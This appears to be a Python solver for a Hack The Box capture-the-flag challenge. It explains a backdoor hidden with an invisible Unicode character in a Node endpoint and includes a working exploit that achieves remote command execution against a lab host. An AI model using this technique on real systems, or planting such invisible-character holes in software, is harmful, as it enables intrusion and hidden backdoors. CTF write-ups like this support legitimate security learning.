#!/usr/bin/env python3
"""
HTB "Hidden Path" (misc, easy) — solver

Vulnerability: invisible Hangul Filler character (U+3164, 'ㅤ') used as a valid
JS identifier/property name inside the /server_status handler.

    const { choice,ㅤ} = req.body;            # ㅤ  = req.body['\u3164']
    ...
    const commands = [
        'free -m', 'uptime', 'iostat', 'mpstat', 'netstat',
        'ps aux',ㅤ                            # hidden 7th element -> our command
    ];
    if (integerChoice < 0 || integerChoice >= commands.length) ...  # length = 7

commands.length is 7 because of the hidden element, so choice=6 passes the
bounds check and exec(commands[6]) executes whatever we put in the invisible
field -> arbitrary command execution (RCE). 'cat flag.txt' reads the flag.

Usage:  python solve.py [URL]
Default URL: http://154.57.164.75:32093
"""
import sys
import urllib.parse
import urllib.request

HIDDEN = "\u3164"  # Hangul Filler (U+3164) — invisible character
URL = sys.argv[1] if len(sys.argv) > 1 else "http://154.57.164.75:32093"
ENDPOINT = URL.rstrip("/") + "/server_status"


def run_command(cmd: str) -> str:
    """POST choice=6 plus the hidden field = cmd, return server stdout."""
    body = urllib.parse.urlencode({"choice": "6", HIDDEN: cmd}).encode()
    req = urllib.request.Request(
        ENDPOINT,
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.read().decode(errors="replace")


if __name__ == "__main__":
    out = run_command("cat flag.txt")
    print(out)
    if "HTB{" in out:
        print("[+] Flag found")
    else:
        print("[-] No flag in response; server may be down or patched")
        sys.exit(1)
